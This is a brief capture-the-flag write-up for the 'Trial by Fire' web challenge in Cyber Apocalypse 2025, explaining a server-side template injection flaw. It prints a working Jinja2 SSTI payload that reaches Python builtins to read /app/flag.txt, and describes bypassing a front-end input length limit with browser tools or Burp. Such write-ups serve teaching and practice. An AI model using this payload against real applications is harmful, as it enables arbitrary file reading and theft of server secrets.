---
layout: load_md
title: The White Circle | Cyber Apocalypse 2025 | Trial by Fire Writeup
desc: Check out our writeup for Trial by Fire for Cyber Apocalypse 2025 capture the flag competition.
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2025
parent: cyber_apocalypse_2025
category: web
challenge: Trial by Fire
tags: "web, twh, ssti"
date: 2025-03-29T00:00:00+00:00
last_update: 2025-03-29T00:00:00+00:00
---


> Solved by thewhiteh4t


- We have an input and a hint for SSTI `Can you read the runes? Perhaps 49 is the key.`
- On the battle result page we can see that SSTI is working


![](https://i.imgur.com/XcNrIpA.png)

- Payload :

```
{% raw %}
    {{ request.__class__._load_form_data.__globals__.__builtins__.open("/app/flag.txt").read() }}
{% endraw %}
```

- Length of the input is restricted in the front-end, so we can either edit the length in inspect or simply use burp


![](https://i.imgur.com/aBge1Lj.png)

